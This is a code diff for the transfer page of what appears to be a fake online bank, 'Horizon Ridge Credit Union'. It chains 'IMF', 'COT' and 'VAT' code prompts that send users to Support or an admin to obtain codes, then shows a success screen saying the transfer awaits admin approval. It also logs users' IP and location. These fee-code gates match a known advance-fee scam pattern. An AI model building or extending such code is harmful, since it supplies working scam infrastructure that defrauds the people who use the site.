@@ -105,7 +105,8 @@ function generateReceipt(options = {}) {
         <div class="flex justify-between text-sm mb-1">
           <span class="font-semibold">Amount:</span><span>${config.currency}${config.amount}</span>
         </div>
-        ${parseFloat(config.fees) > 0
+        ${
+          parseFloat(config.fees) > 0
             ? `<div class="flex justify-between text-sm mb-1">
                   <span class="font-semibold">Fees:</span><span>${config.currency}${config.fees}</span>
                 </div>`
@@ -115,26 +116,31 @@ function generateReceipt(options = {}) {
           <span>Total:</span><span>${config.currency}${config.totalAmount}</span>
         </div>
       </div>
-      ${Object.keys(config.additionalFields).length > 0
-            ? `<div class="mb-4 border-t border-dashed border-gray-300 dark:border-gray-700 pt-3">
+      ${
+        Object.keys(config.additionalFields).length > 0
+          ? `<div class="mb-4 border-t border-dashed border-gray-300 dark:border-gray-700 pt-3">
                 ${Object.entries(config.additionalFields)
-                    .map(([key, value]) => `
+                  .map(
+                    ([key, value]) => `
                       <div class="flex justify-between text-xs mb-1">
                         <span class="font-semibold">${key}:</span><span>${value}</span>
                       </div>
-                    `).join("")}
+                    `
+                  )
+                  .join("")}
               </div>`
-            : ""
-        }
-      ${config.showFooter
-            ? `<div class="text-center mt-4 pt-3 border-t-2 border-dashed border-gray-300 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400">
+          : ""
+      }
+      ${
+        config.showFooter
+          ? `<div class="text-center mt-4 pt-3 border-t-2 border-dashed border-gray-300 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400">
                 <div>${config.footerText}</div>
                 <div class="mt-2 text-[11px] text-gray-400 dark:text-gray-500">
                   This is a Horizon-generated receipt
                 </div>
               </div>`
-            : ""
-        }
+          : ""
+      }
     </div>
     `;
 }
@@ -144,27 +150,28 @@ function generateReceiptId() {
   return `RCP-${timestamp}-${random}`;
 }
 
-// Modal for COT, VAT, IMF
-function showFeeModal(type, onSuccess) {
-  let modal = document.getElementById("fee-modal");
+// Modal for IMF, COT, VAT
+function showCodeModal(type, onSuccess) {
+  let modal = document.getElementById("code-modal");
   if (!modal) {
     modal = document.createElement("div");
-    modal.id = "fee-modal";
+    modal.id = "code-modal";
     document.body.appendChild(modal);
   }
   modal.className = "";
   modal.innerHTML = `
     <div class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
       <div class="bg-white dark:bg-gray-900 rounded-lg shadow-lg w-full max-w-sm p-6 relative">
-        <button id="close-fee-modal" class="absolute top-2 right-3 text-gray-400 hover:text-gray-700 dark:hover:text-white text-lg">&times;</button>
+        <button id="close-code-modal" class="absolute top-2 right-3 text-gray-400 hover:text-gray-700 dark:hover:text-white text-lg">&times;</button>
         <h4 class="text-base font-semibold mb-2 text-gray-900 dark:text-white">
-          <i class="fa fa-credit-card mr-2"></i>Enter ${type} Code
+          <i class="fa fa-key mr-2"></i>Enter ${type} Code
         </h4>
         <div class="mb-2 text-xs text-gray-500 dark:text-gray-300">
-          Please enter your ${type} code to proceed.
+          Please enter your ${type} code to proceed.<br>
+          <span class="text-red-500">Contact <a href="/contact" target="_blank" class="underline">Support</a> to get your code or chat with admin live.</span>
         </div>
-        <form id="fee-form" class="space-y-3">
-          <input type="text" name="feeCode" maxlength="8"
+        <form id="code-form" class="space-y-3">
+          <input type="text" name="code" maxlength="12"
             class="w-full px-3 py-2 border rounded focus:outline-none focus:ring"
             placeholder="Enter ${type} Code" required />
           <button type="submit"
@@ -175,13 +182,13 @@ function showFeeModal(type, onSuccess) {
       </div>
     </div>
   `;
-  document.getElementById("close-fee-modal").onclick = () => {
+  document.getElementById("close-code-modal").onclick = () => {
     modal.innerHTML = "";
     modal.className = "hidden";
   };
-  document.getElementById("fee-form").onsubmit = async function (e) {
+  document.getElementById("code-form").onsubmit = async function (e) {
     e.preventDefault();
-    const code = this.feeCode.value.trim();
+    const code = this.code.value.trim();
     if (code.length >= 4) {
       modal.innerHTML = "";
       modal.className = "hidden";
@@ -189,6 +196,61 @@ function showFeeModal(type, onSuccess) {
     } else {
       showToast("Invalid code. Please try again.", "error");
     }
+  };
+}
+
+// Success Animation Modal
+function showSuccessModal() {
+  let modal = document.getElementById("success-modal");
+  if (!modal) {
+    modal = document.createElement("div");
+    modal.id = "success-modal";
+    document.body.appendChild(modal);
+  }
+  modal.className = "";
+  modal.innerHTML = `
+    <div class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60">
+      <div class="bg-white dark:bg-gray-900 rounded-lg shadow-2xl w-full max-w-xs p-8 flex flex-col items-center relative">
+        <canvas id="success-canvas" width="120" height="120" style="display:block;margin-bottom:16px;"></canvas>
+        <h3 class="text-lg font-bold text-green-700 dark:text-green-400 mb-2">Transfer Successful!</h3>
+        <p class="text-sm text-gray-700 dark:text-gray-300 mb-2 text-center">Your transfer was made and is <b>awaiting Admin approval</b>.</p>
+        <button id="close-success-modal" class="mt-4 px-5 py-2 rounded bg-blue-600 text-white hover:bg-blue-700 transition">Close</button>
+      </div>
+    </div>
+    <style>
+      #success-canvas { background: transparent; }
+    </style>
+  `;
+  // Draw animated check
+  const canvas = document.getElementById("success-canvas");
+  const ctx = canvas.getContext("2d");
+  let progress = 0;
+  function drawCheck() {
+    ctx.clearRect(0, 0, 120, 120);
+    ctx.lineWidth = 6;
+    ctx.strokeStyle = "#16a34a";
+    ctx.beginPath();
+    ctx.arc(60, 60, 48, Math.PI * 0.5, Math.PI * (2 * progress), false);
+    ctx.stroke();
+    if (progress < 1) {
+      progress += 0.03;
+      requestAnimationFrame(drawCheck);
+    } else {
+      // Draw check mark
+      ctx.beginPath();
+      ctx.moveTo(40, 65);
+      ctx.lineTo(55, 80);
+      ctx.lineTo(85, 45);
+      ctx.strokeStyle = "#16a34a";
+      ctx.lineWidth = 8;
+      ctx.stroke();
+    }
+  }
+  drawCheck();
+  document.getElementById("close-success-modal").onclick = () => {
+    modal.innerHTML = "";
+    modal.className = "hidden";
+    window.location.reload();
   };
 }
 
@@ -424,7 +486,7 @@ const localTransfer = async () => {
                 date: new Date().toLocaleDateString(),
                 time: new Date().toLocaleTimeString(),
                 amount: tx.amount,
-                currency: '$',
+                currency: "$",
                 description: tx.desc,
                 senderName: tx.profile.full_name,
                 recipientName: tx.accountName,
@@ -434,31 +496,24 @@ const localTransfer = async () => {
                 status: "Pending",
                 referenceNumber: tx.accountNum,
                 fees: tx.fee,
-                totalAmount: (parseFloat(tx.amount) + parseFloat(tx.fee)).toFixed(2),
+                totalAmount: (
+                  parseFloat(tx.amount) + parseFloat(tx.fee)
+                ).toFixed(2),
                 additionalFields: {
                   "Routing Number": tx.route,
-                  "IP": tx.ipLoc.ip || "N/A",
-                  "Location": `${tx.ipLoc.city || ""}, ${tx.ipLoc.region || ""}, ${tx.ipLoc.country_name || ""}`
-                }
+                  IP: tx.ipLoc.ip || "N/A",
+                  Location: `${tx.ipLoc.city || ""}, ${tx.ipLoc.region || ""}, ${tx.ipLoc.country_name || ""}`,
+                },
               })}
               <div class="mt-6 flex flex-col gap-2 justify-center">
-                <button id="cot-btn" class="bg-yellow-600 text-white px-6 py-2 rounded shadow hover:bg-yellow-700 transition font-semibold">
-                  Enter COT Code
-                </button>
-                <button id="vat-btn" class="bg-blue-600 text-white px-6 py-2 rounded shadow hover:bg-blue-700 transition font-semibold">
-                  Enter VAT Code
-                </button>
-                <button id="imf-btn" class="bg-purple-600 text-white px-6 py-2 rounded shadow hover:bg-purple-700 transition font-semibold">
-                  Enter IMF Code
-                </button>
-                <button id="complete-local-btn" class="bg-green-600 text-white px-6 py-2 rounded shadow hover:bg-green-700 transition font-semibold" disabled>
+                <button id="complete-local-btn" class="bg-green-600 text-white px-6 py-2 rounded shadow hover:bg-green-700 transition font-semibold">
                   Complete Transaction
                 </button>
               </div>
             </div>
           </div>
         </div>
-        <div id="fee-modal" class="hidden"></div>
+        <div id="code-modal" class="hidden"></div>
         <style>
           .receipt-modal-content::-webkit-scrollbar { width: 8px; background: transparent; }
           .receipt-modal-content::-webkit-scrollbar-thumb { background: #e5e7eb; border-radius: 4px; }
@@ -476,110 +531,89 @@ const localTransfer = async () => {
         </style>
       `;
 
-      let cotValid = false, vatValid = false, imfValid = false;
-      const enableComplete = () => {
-        const btn = document.getElementById("complete-local-btn");
-        btn.disabled = !(cotValid && vatValid && imfValid);
-      };
-
       document.getElementById("close-receipt-modal").onclick = () => {
         modal.innerHTML = "";
         modal.className = "hidden";
       };
 
-      document.getElementById("cot-btn").onclick = () => {
-        showFeeModal("COT", () => { cotValid = true; enableComplete(); showToast("COT code validated.", "success"); });
-      };
-      document.getElementById("vat-btn").onclick = () => {
-        showFeeModal("VAT", () => { vatValid = true; enableComplete(); showToast("VAT code validated.", "success"); });
-      };
-      document.getElementById("imf-btn").onclick = () => {
-        showFeeModal("IMF", () => { imfValid = true; enableComplete(); showToast("IMF code validated.", "success"); });
-      };
+      document.getElementById("complete-local-btn").onclick = () => {
+        showCodeModal("IMF", () => {
+          showCodeModal("COT", () => {
+            showCodeModal("VAT", async () => {
+              // Success animation
+              showSuccessModal();
+              // Save transaction
+              try {
+                const amountNum = parseFloat(tx.amount);
+                const feeNum = parseFloat(tx.fee);
+                const total = amountNum + feeNum;
+                const balanceBefore = parseFloat(tx.account.balance);
+                const balanceAfter = balanceBefore - total;
 
-      document.getElementById("complete-local-btn").onclick = async () => {
-        if (!(cotValid && vatValid && imfValid)) return;
-        try {
-          const amountNum = parseFloat(tx.amount);
-          const feeNum = parseFloat(tx.fee);
-          const total = amountNum + feeNum;
-          const balanceBefore = parseFloat(tx.account.balance);
-          const balanceAfter = balanceBefore - total;
+                await supabase
+                  .from("accounts")
+                  .update({ balance: balanceAfter })
+                  .eq("id", tx.account.id);
 
-          await supabase
-            .from("accounts")
-            .update({ balance: balanceAfter })
-            .eq("id", tx.account.id);
+                const { data: txn, error: txnError } = await supabase
+                  .from("transactions")
+                  .insert([
+                    {
+                      account_id: tx.account.id,
+                      user_id: tx.profile.id,
+                      type: "transfer",
+                      description: tx.desc,
+                      amount: total,
+                      balance_before: balanceBefore,
+                      balance_after: balanceAfter,
+                      status: "pending",
+                    },
+                  ])
+                  .select()
+                  .single();
 
-          // Insert transaction
-          const { data: txn, error: txnError } = await supabase
-            .from("transactions")
-            .insert([
-              {
-                account_id: tx.account.id,
-                user_id: tx.profile.id,
-                type: "transfer",
-                description: tx.desc,
-                amount: total,
-                balance_before: balanceBefore,
-                balance_after: balanceAfter,
-                status: "completed",
-              },
-            ])
-            .select()
-            .single();
+                await supabase.from("notifications").insert([
+                  {
+                    user_id: tx.profile.id,
+                    title: "Local Transfer Initiated",
+                    message: `Your local transfer of ${fmt(tx.amount)} to ${tx.accountName} is awaiting admin approval.`,
+                    type: "info",
+                    read: false,
+                  },
+                ]);
 
-          if (txnError) {
-            showToast("Transaction failed: " + txnError.message, "error");
-            return;
-          }
-
-          // Insert notification
-          await supabase.from("notifications").insert([
-            {
-              user_id: tx.profile.id,
-              title: "Local Transfer Completed",
-              message: `Your local transfer of ${fmt(tx.amount)} to ${tx.accountName} has been completed.`,
-              type: "info",
-              read: false,
-            },
-          ]);
-
-          // Send receipt email (fire and forget)
-          fetch("/api/send-email", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              to: tx.profile.email,
-              subject: "Local Transfer Receipt",
-              html: generateReceipt({
-                amount: tx.amount,
-                senderName: tx.profile.full_name,
-                recipientName: tx.accountName,
-                bankName: tx.bankname,
-                accountNumber: tx.accountNum,
-                description: tx.desc,
-                fees: tx.fee,
-                status: "Completed",
-                referenceNumber: txn?.id || generateReceiptId(),
-                companyName: "Horizon Ridge Credit Union",
-                companyAddress: "123 Main St, City, Country",
-                companyPhone: "+1 (555) 123-4567",
-                companyEmail: "horizonridgecreditunion@gmail.com",
-              }),
-            }),
+                fetch("/api/send-email", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    to: tx.profile.email,
+                    subject: "Local Transfer Receipt",
+                    html: generateReceipt({
+                      amount: tx.amount,
+                      senderName: tx.profile.full_name,
+                      recipientName: tx.accountName,
+                      bankName: tx.bankname,
+                      accountNumber: tx.accountNum,
+                      description: tx.desc,
+                      fees: tx.fee,
+                      status: "Pending",
+                      referenceNumber: txn?.id || generateReceiptId(),
+                      companyName: "Horizon Ridge Credit Union",
+                      companyAddress: "123 Main St, City, Country",
+                      companyPhone: "+1 (555) 123-4567",
+                      companyEmail: "horizonridgecreditunion@gmail.com",
+                    }),
+                  }),
+                });
+              } catch (err) {
+                showToast(
+                  "Failed to process transaction. Please try again.",
+                  "error"
+                );
+              }
+            });
           });
-
-          account.balance = balanceAfter;
-          showToast("Transaction completed!", "success");
-          setTimeout(() => {
-            modal.innerHTML = "";
-            modal.className = "hidden";
-            window.location.reload();
-          }, 1200);
-        } catch (err) {
-          showToast("Failed to process transaction. Please try again.", "error");
-        }
+        });
       };
     }
   }
@@ -709,6 +743,7 @@ const localTransfer = async () => {
         </div>
       </div>
       <div id="otp-modal" class="hidden"></div>
+      <div id="success-modal" class="hidden"></div>
     `,
     pageEvents,
   };
